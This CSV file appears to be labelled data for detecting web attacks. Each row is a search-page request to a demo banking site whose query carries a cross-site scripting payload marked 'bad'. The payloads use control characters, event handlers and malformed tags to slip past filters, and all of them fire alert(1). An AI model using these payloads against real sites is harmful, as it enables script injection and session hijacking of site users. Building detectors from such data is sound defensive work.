path,content,host,class_flag
"/search.jsp?query=<a href=""\x18javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x11javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x80\x88javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x80\x89javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x17javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x03javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x0Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x1Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x00javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x10javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x80\x82javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x20javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x13javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x09javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x80\x8Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x14javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x19javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x1Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x80\xAFjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x1Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x80\x87javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE1\x9A\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x80\x83javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x04javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x08javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x80\x84javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x80\x86javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE3\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x0Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x0Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x0Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x15javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x80\xA8javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x16javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x02javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x1Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x06javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x80\xA9javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x80\x85javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x1Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE2\x81\x9Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x1Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javascript\x00:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javascript\x3A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javascript\x09:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javascript\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javascript\x0A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x \x22onerror=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x \x0Bonerror=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x \x0Donerror=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x \x2Fonerror=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x \x09onerror=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x \x0Conerror=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x \x00onerror=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x \x27onerror=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x \x20onerror=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\x3Bjavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\x0Djavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\x81javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\x84javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE3\x80\x80javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\x09javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\x89javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\x85javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\x88javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\x00javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\xA8javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE1\x9A\x80javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\x0Cjavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\x2Bjavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>-javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\x0Ajavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\xAFjavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\x7Ejavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\x87javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\xA9javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xC2\x85javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\x83javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\x80javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\x21javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\x82javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE2\x80\x86javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\x0Bjavascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\x20javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""`'><script>\xC2\xA0javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />",,demo.testfire.net,['bad']
"/search.jsp?query=""/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />",,demo.testfire.net,['bad']
"/search.jsp?query=""/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />",,demo.testfire.net,['bad']
"/search.jsp?query=""/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />",,demo.testfire.net,['bad']
"/search.jsp?query=""/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />",,demo.testfire.net,['bad']
"/search.jsp?query=""/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />",,demo.testfire.net,['bad']
"/search.jsp?query=""/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />",,demo.testfire.net,['bad']
"/search.jsp?query=""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",,demo.testfire.net,['bad']
"/search.jsp?query=""/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />",,demo.testfire.net,['bad']
/search.jsp?query=<script\x2F>javascript:alert(1)</script>,,demo.testfire.net,['bad']
/search.jsp?query=<script\x20>javascript:alert(1)</script>,,demo.testfire.net,['bad']
/search.jsp?query=<script\x0D>javascript:alert(1)</script>,,demo.testfire.net,['bad']
/search.jsp?query=<script\x0A>javascript:alert(1)</script>,,demo.testfire.net,['bad']
/search.jsp?query=<script\x0C>javascript:alert(1)</script>,,demo.testfire.net,['bad']
/search.jsp?query=<script\x00>javascript:alert(1)</script>,,demo.testfire.net,['bad']
/search.jsp?query=<script\x09>javascript:alert(1)</script>,,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x onerror\x0B=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x onerror\x00=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x onerror\x0C=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x onerror\x0D=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x onerror\x20=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x onerror\x0A=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src=xxx:x onerror\x09=javascript:alert(1)>",,demo.testfire.net,['bad']
/search.jsp?query=<script>javascript:alert(1)<\x00/script>,,demo.testfire.net,['bad']
"/search.jsp?query=<img src=# onerror\x3D""javascript:alert(1)"" >",,demo.testfire.net,['bad']
/search.jsp?query=<input onfocus=javascript:alert(1) autofocus>,,demo.testfire.net,['bad']
/search.jsp?query=<input onblur=javascript:alert(1) autofocus><input autofocus>,,demo.testfire.net,['bad']
/search.jsp?query=<video poster=javascript:javascript:alert(1)//,,demo.testfire.net,['bad']
/search.jsp?query=<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,,demo.testfire.net,['bad']
/search.jsp?query=<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X,,demo.testfire.net,['bad']
"/search.jsp?query=<video><source onerror=""javascript:javascript:alert(1)"">",,demo.testfire.net,['bad']
"/search.jsp?query=<video onerror=""javascript:javascript:alert(1)""><source>",,demo.testfire.net,['bad']
"/search.jsp?query=<form><button formaction=""javascript:javascript:alert(1)"">X",,demo.testfire.net,['bad']
/search.jsp?query=<body oninput=javascript:alert(1)><input autofocus>,,demo.testfire.net,['bad']
"/search.jsp?query=<math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",,demo.testfire.net,['bad']
/search.jsp?query=<frameset onload=javascript:alert(1)>,,demo.testfire.net,['bad']
"/search.jsp?query=<table background=""javascript:javascript:alert(1)"">",,demo.testfire.net,['bad']
"/search.jsp?query=<!--<img src=""--><img src=x onerror=javascript:alert(1)//"">",,demo.testfire.net,['bad']
"/search.jsp?query=<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",,demo.testfire.net,['bad']
"/search.jsp?query=<![><img src=""]><img src=x onerror=javascript:alert(1)//"">",,demo.testfire.net,['bad']
"/search.jsp?query=<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",,demo.testfire.net,['bad']
"/search.jsp?query=<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%<svg/%>);visibility:hidden onload=javascript:alert(1)></div>",,demo.testfire.net,['bad']
"/search.jsp?query=<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(1)//#"">XXX</a></body>",,demo.testfire.net,['bad']
/search.jsp?query=<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>,,demo.testfire.net,['bad']
"/search.jsp?query=<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",,demo.testfire.net,['bad']
"/search.jsp?query=<object data=""data:text/html;base64,%(base64)s"">",,demo.testfire.net,['bad']
"/search.jsp?query=<embed src=""data:text/html;base64,%(base64)s"">",,demo.testfire.net,['bad']
/search.jsp?query=<b <script>alert(1)</script>0,,demo.testfire.net,['bad']
"/search.jsp?query=<div id=""div1""><input value=""``onmouseover=javascript:alert(1)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<x '=""foo""><x foo='><img src=x onerror=javascript:alert(1)//'>",,demo.testfire.net,['bad']
"/search.jsp?query=<embed src=""javascript:alert(1)"">",,demo.testfire.net,['bad']
"/search.jsp?query=<img src=""javascript:alert(1)"">",,demo.testfire.net,['bad']
"/search.jsp?query=<image src=""javascript:alert(1)"">",,demo.testfire.net,['bad']
"/search.jsp?query=<script src=""javascript:alert(1)"">",,demo.testfire.net,['bad']
/search.jsp?query=<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x,,demo.testfire.net,['bad']
